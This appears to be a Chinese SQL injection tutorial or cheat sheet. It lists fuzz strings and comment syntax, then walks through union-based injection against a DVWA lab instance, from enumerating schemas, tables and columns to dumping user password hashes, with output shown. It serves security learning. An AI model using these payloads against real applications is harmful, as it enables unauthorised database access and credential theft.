注入方法
=====================================

常见的注入点
--------------------------------------
- GET/POST/PUT/DELETE参数(查询字符串，表单)
- X-Forwarded-For
- 文件名
- cookier

Fuzz注入点
--------------------------------------
- ``'`` / ``"``
- ``1/1``
- ``1/0``
- ``and 1=1``
- ``" and "1"="1``
- ``and 1=2``
- ``or 1=1``
- ``or 1=``
- ``' and '1'='1``
- ``+`` ``-`` ``^`` ``*`` ``%`` ``/`` 
- ``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``
- ``~``
- ``!``
- ``@``
- 反引号执行

测试列数
--------------------------------------
``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回

堆叠注入
--------------------------------------
``;select 1``

注释符
--------------------------------------
- MYSQL：``#(单行注释)`` , ``--+(单行注释)`` , ``/*...*/(多行注释)``
- ORACLE: ``--(单行注释)`` , ``/*...*/(多行注释)``

判断过滤规则
--------------------------------------
- 是否有trunc
- 是否过滤某个字符
- 是否过滤关键字
- slash和编码

获取信息
--------------------------------------
	
- 判断数据库表是否存在
	``and exsits (select * from admin)`` MySQL
	如：http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' and exists+(select * from guestbook)--+&Submit=Submit#
- 确定字段数
    order by(MySQL)
	例如 ``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' order by 6--+&Submit=Submit#`` ，不断增加数字，直到返回错误
    select into(MySQL)
	例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 ``null`` 至不返回
- 匹配数据类型
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select 'TEST',null--+&Submit=Submit#``
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select null,'TEST'--+&Submit=Submit#``
	注：只要程序不出现错误，就知道存储TEST值的列可以保存一个字符串。
	
测试权限
--------------------------------------
- 文件操作
    - 读敏感文件
    - 写shell
- 带外通道
    - 网络请求
	
MYSQL实战
--------------------------------------
- 查询数据库
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select null,schema_name from information_schema.schemata--+&Submit=Submit#``
	::
	
		ID: 1' union select null,schema_name from information_schema.schemata-- 
		First name: admin
		Surname: admin
		
		ID: 1' union select null,schema_name from information_schema.schemata-- 
		First name: 
		Surname: information_schema
		
		ID: 1' union select null,schema_name from information_schema.schemata-- 
		First name: 
		Surname: dvwa``
		
- 查询表名
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'--+&Submit=Submit#``
	::
	
		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
		First name: admin
		Surname: admin

		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
		First name: dvwa
		Surname: guestbook

		ID: 1' union select table_schema,table_name from information_schema.tables where table_schema!='information_schema'-- 
		First name: dvwa
		Surname: users
		
- 查询列名
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select table_name,column_name from information_schema.columns where table_name='users'--+&Submit=Submit#``
	::
	
		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: admin
		Surname: admin

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: user_id

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: first_name

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: last_name

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: user

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: password

		ID: 1' union select table_name,column_name from information_schema.columns where table_name='users'-- 
		First name: users
		Surname: avatar
		
- 查询数据
	``http://192.168.42.129/dvwa/vulnerabilities/sqli/?id=1' union select user_id,password from users--+&Submit=Submit#``
	::
	
		ID: 1' union select user_id,password from users-- 
		First name: admin
		Surname: admin

		ID: 1' union select user_id,password from users-- 
		First name: 1
		Surname: 21232f297a57a5a743894a0e4a801fc3

		ID: 1' union select user_id,password from users-- 
		First name: 2
		Surname: e99a18c428cb38d5f260853678922e03

		ID: 1' union select user_id,password from users-- 
		First name: 3
		Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

		ID: 1' union select user_id,password from users-- 
		First name: 4
		Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

		ID: 1' union select user_id,password from users-- 
		First name: 5
		Surname: 5f4dcc3b5aa765d61d8327deb882cf99

		ID: 1' union select user_id,password from users-- 
		First name: 6
		Surname: ee11cbb19052e40b07aac0ca060c23ee
	